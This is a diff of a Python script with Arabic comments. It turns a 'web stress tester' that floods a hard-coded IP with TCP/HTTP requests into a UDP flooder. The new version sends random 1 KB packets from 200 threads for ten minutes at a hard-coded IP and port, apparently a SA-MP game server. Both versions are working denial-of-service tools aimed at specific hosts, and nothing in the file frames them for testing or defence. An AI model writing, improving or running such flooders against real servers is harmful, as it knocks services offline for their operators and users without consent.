@@ -1,52 +1,55 @@
 import socket
+import random
 import threading
 import time
 
 # =====================================================================
-# === TRAPKING WEB STRESS & CONNECTION TESTER ===
+# === TRAPKING CLOUD UDP FLOODER (VPS Optimized Edition) ===
 # =====================================================================
 
-TARGET_HOST = "185.241.208.142"  # استبدله برابط أو IP الموقع المستهدف (بدون http://)
-TARGET_PORT = 80             # بورت الويب القياسي (80 لـ HTTP أو 443 لـ HTTPS)
-DURATION = 210                # مدة الاختبار بالثواني
-THREADS_COUNT = 200          # عدد الخيوط المتزامنة
+# ضع هنا الـ IP المستهدف للبورت الخاص بسيرفر الـ SA-MP
+TARGET_IP = "89.46.1.130" 
+TARGET_PORT = 7008          # البورت الافتراضي لـ SA-MP (أو البورت الخاص بالهدف)
+DURATION = 600               # مدة الضغط بالثواني
+THREADS_COUNT = 200         # عدد الخيوط المتعددة لاستغلال معالج Ryzen 9 بالكامل
 
-def web_stress_worker(stop_event):
-    while not stop_event.is_set():
-        try:
-            # إنشاء اتصال TCP حقيقي بالموقع (يناسب هيكل استجابة سيرفرات الويب)
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            s.connect((TARGET_HOST, TARGET_PORT))
-            
-            # إرسال طلب تصفح وهمي (HTTP GET Request) لإنعاش أو اختبار استجابة الخادم
-            request = f"GET / HTTP/1.1\r\nHost: {TARGET_HOST}\r\nConnection: keep-alive\r\n\r\.encode()"
-            s.sendall(request)
-            
-            s.close()
-        except:
-            pass
+# توليد حزم بيانات عشوائية وكبيرة نسبياً لإشغال ممر الشبكة
+# سيرفرات SA-MP تستجيب لطلبات معينة أو حزم عشوائية مكثفة
+packet_data = random._urandom(1024) # حزمة بحجم 1 كيلوبايت لكل إرسال
 
-def run_web_test():
-    print(f"[*] جاري بدء اختبار الاتصال مع الموقع {TARGET_HOST}:{TARGET_PORT} لمدة {DURATION} ثانية...")
+def stress_target():
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    end_time = time.time() + DURATION
     
-    stop_event = threading.Event()
-    threads = []
+    sent_packets = 0
+    while time.time() < end_time:
+        try:
+            # إرسال حزم الـ UDP المتتالية بأقصى سرعة ممكنة
+            client.sendto(packet_data, (TARGET_IP, TARGET_PORT))
+            sent_packets += 1
+        except Exception as e:
+            # في حال حدث أي ضغط على السوكت، نكمل الإرسال بدون توقف
+            pass
+            
+    client.close()
 
-    # إطلاق الخيوط المتزامنة لاختبار قدرة خادم الموقع على تحمل اتصالات الـ TCP
+def main():
+    print(f"[*] جاري بدء عملية الضغط على السيرفر المستهدف: {TARGET_IP}:{TARGET_PORT}")
+    print(f"[*] استخدام {THREADS_COUNT} خيط (Threads) لاستغلال قوة المعالج السحابي...")
+    
+    threads = []
+    
+    # تشغيل الخيوط بالتوازي
     for _ in range(THREADS_COUNT):
-        t = threading.Thread(target=web_stress_worker, args=(stop_event,))
-        t.daemon = True
+        t = threading.Thread(target=stress_target)
         threads.append(t)
         t.start()
-
-    time.sleep(DURATION)
-    
-    stop_event.set()
+        
+    # الانتظار حتى تنتهي المدة المحددة
     for t in threads:
-        t.join(timeout=0.1)
-
-    print("[+] انتهى اختبار الموقع بنجاح!")
+        t.join()
+        
+    print("\n[+] انتهت عملية الضغط الميداني.")
 
 if __name__ == "__main__":
-    run_web_test()
+    main()
